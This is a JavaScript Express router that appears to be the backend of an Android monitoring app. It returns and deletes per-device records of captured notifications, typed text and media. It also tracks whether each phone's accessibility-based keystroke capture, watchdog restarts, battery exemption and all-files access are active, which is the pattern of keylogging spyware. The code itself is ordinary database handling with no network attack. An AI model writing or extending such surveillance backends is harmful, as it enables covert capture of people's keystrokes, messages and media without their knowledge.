import { Router } from 'express'
import { db } from '../db/client.js'
import { deleteImage } from '../cloudinary.js'
import { isOnline, pickActiveRole, describeAppHealth, summarizeDeviceHealth } from '../appRoles.js'

const router = Router()

router.get('/', async (_req, res) => {
    try {
        const [result, statusResult] = await Promise.all([
            db.query(
                `SELECT id, id AS name, MAX(last_seen) AS last_seen, SUM(cnt)::int AS notification_count
                 FROM (
                     SELECT device_id AS id, MAX(received_at) AS last_seen, COUNT(*) AS cnt
                     FROM notifications
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(captured_at) AS last_seen, COUNT(*) AS cnt
                     FROM typed_text
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(received_at) AS last_seen, COUNT(*) AS cnt
                     FROM media_captures
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(last_seen) AS last_seen, 0 AS cnt
                     FROM app_status
                     GROUP BY device_id
                 ) d
                 GROUP BY id
                 ORDER BY last_seen DESC`
            ),
            db.query(
                `SELECT device_id, app_role, package_name, app_label, version_name,
                        listener_enabled, accessibility_enabled, battery_exempt,
                        media_enabled, all_files_access, listener_connected,
                         foreground_service_running, watchdog_enabled, boot_time,
                         install_time, update_time, last_listener_event_at,
                         typed_text_alive_at, typed_text_last_event_at, typed_text_connected,
                         typed_service_bind_total, typed_events_total, typed_text_sent_total,
                         typed_placeholder_rejected_total, typed_service_reconnect_total,
                         watchdog_last_fired_at, notification_rebind_total,
                         listener_last_connected_at, listener_last_disconnected_at,
                         notification_images_total, notification_images_failed_total, last_seen
                  FROM app_status

                 ORDER BY device_id, app_role`
            ),
        ])

        const byDevice = new Map()
        for (const row of statusResult.rows) {
            if (!byDevice.has(row.device_id)) byDevice.set(row.device_id, [])
            byDevice.get(row.device_id).push(row)
        }

        const now = Date.now()
        const devices = result.rows.map(d => {
            const rawApps = byDevice.get(d.id) ?? []
            const apps = rawApps.map(a => ({
                role: a.app_role,
                packageName: a.package_name,
                appLabel: a.app_label,
                versionName: a.version_name,
                listenerEnabled: a.listener_enabled,
                accessibilityEnabled: a.accessibility_enabled,
                batteryExempt: a.battery_exempt,
                mediaEnabled: a.media_enabled,
                allFilesAccess: a.all_files_access,
                listenerConnected: a.listener_connected,
                foregroundServiceRunning: a.foreground_service_running,
                watchdogEnabled: a.watchdog_enabled,
                bootTime: a.boot_time,
                installTime: a.install_time,
                updateTime: a.update_time,
                lastListenerEventAt: a.last_listener_event_at,
                typedTextAliveAt: a.typed_text_alive_at,
                typedTextLastEventAt: a.typed_text_last_event_at,
                typedTextConnected: a.typed_text_connected,
                typedServiceBindTotal: a.typed_service_bind_total,
                typedEventsTotal: a.typed_events_total,
                typedTextSentTotal: a.typed_text_sent_total,
                typedPlaceholderRejectedTotal: a.typed_placeholder_rejected_total,
                typedServiceReconnectTotal: a.typed_service_reconnect_total,
                watchdogLastFiredAt: a.watchdog_last_fired_at,
                notificationRebindTotal: a.notification_rebind_total,
                listenerLastConnectedAt: a.listener_last_connected_at,
                listenerLastDisconnectedAt: a.listener_last_disconnected_at,
                notificationImagesTotal: a.notification_images_total,
                notificationImagesFailedTotal: a.notification_images_failed_total,
                lastSeen: a.last_seen,
                online: isOnline(a.last_seen, now),
                ...describeAppHealth(a, now),
            }))
            return {
                ...d,
                activeNotificationRole: pickActiveRole(rawApps, 'notification'),
                activeTextRole: pickActiveRole(rawApps, 'text'),
                ...summarizeDeviceHealth(rawApps, now),
                apps,
            }
        })
        return res.json(devices)
    } catch (err) {
        console.error('GET /api/devices error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

router.get('/:id/status-history', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT created_at, app_role, version_name, listener_enabled,
                    accessibility_enabled, battery_exempt, media_enabled,
                    all_files_access, listener_connected,
                    foreground_service_running, watchdog_enabled,
                    boot_time, last_listener_event_at
             FROM app_status_history
             WHERE device_id = $1
             ORDER BY created_at DESC
             LIMIT 300`,
            [req.params.id]
        )
        return res.json(result.rows.map(row => ({
            createdAt: row.created_at,
            role: row.app_role,
            versionName: row.version_name,
            listenerEnabled: row.listener_enabled,
            accessibilityEnabled: row.accessibility_enabled,
            batteryExempt: row.battery_exempt,
            mediaEnabled: row.media_enabled,
            allFilesAccess: row.all_files_access,
            listenerConnected: row.listener_connected,
            foregroundServiceRunning: row.foreground_service_running,
            watchdogEnabled: row.watchdog_enabled,
            bootTime: row.boot_time,
            lastListenerEventAt: row.last_listener_event_at,
        })))
    } catch (err) {
        console.error('GET /api/devices/:id/status-history error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

router.delete('/:id', async (req, res) => {
    const { id } = req.params
    try {
        const images = await db.query(
            'SELECT image_url FROM notifications WHERE device_id = $1 AND image_url IS NOT NULL',
            [id]
        )
        const media = await db.query(
            'SELECT media_url FROM media_captures WHERE device_id = $1 AND media_url IS NOT NULL',
            [id]
        )
        const [notifResult, textResult, mediaResult, statusResult, historyResult, favoriteResult] = await Promise.all([
            db.query('DELETE FROM notifications WHERE device_id = $1', [id]),
            db.query('DELETE FROM typed_text WHERE device_id = $1', [id]),
            db.query('DELETE FROM media_captures WHERE device_id = $1', [id]),
            db.query('DELETE FROM app_status WHERE device_id = $1', [id]),
            db.query('DELETE FROM app_status_history WHERE device_id = $1', [id]),
            db.query('DELETE FROM favorites WHERE device_id = $1', [id]),
        ])
        images.rows.forEach(row => deleteImage(row.image_url))
        media.rows.forEach(row => deleteImage(row.media_url))
        return res.json({
            deleted: notifResult.rowCount + textResult.rowCount + mediaResult.rowCount,
            notifications: notifResult.rowCount,
            typedText: textResult.rowCount,
            media: mediaResult.rowCount,
            appStatus: statusResult.rowCount,
            appStatusHistory: historyResult.rowCount,
            favorites: favoriteResult.rowCount,
        })
    } catch (err) {
        console.error('DELETE /api/devices/:id error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

export default router
